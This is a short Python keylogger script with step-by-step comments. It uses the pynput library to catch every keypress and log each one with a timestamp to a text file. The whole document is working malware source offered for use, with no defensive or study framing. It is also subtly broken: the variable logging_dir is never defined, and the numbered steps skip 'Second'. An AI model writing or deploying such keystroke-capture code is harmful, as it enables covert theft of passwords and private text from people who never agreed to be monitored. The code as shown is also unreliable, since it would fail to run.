# First, install pynput using pip

from pynput.keyboard import Key, Listener #Importing the key and listener to monitor the keyboard
import logging #Then the info will be logged in a file

# Third, setting up a path to store the files in and the log will be stored in that format

logging.basicConfig(filename=(logging_dir + "log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Fourth, create a function that creates the event on_press and takes the key as a paremeter
def on_press(key):
    logging.info(str(key))
    
# Lastly, create a listener and define the on_press method within it
with Listener(on_press=on_press) as listener:
    listener.join()
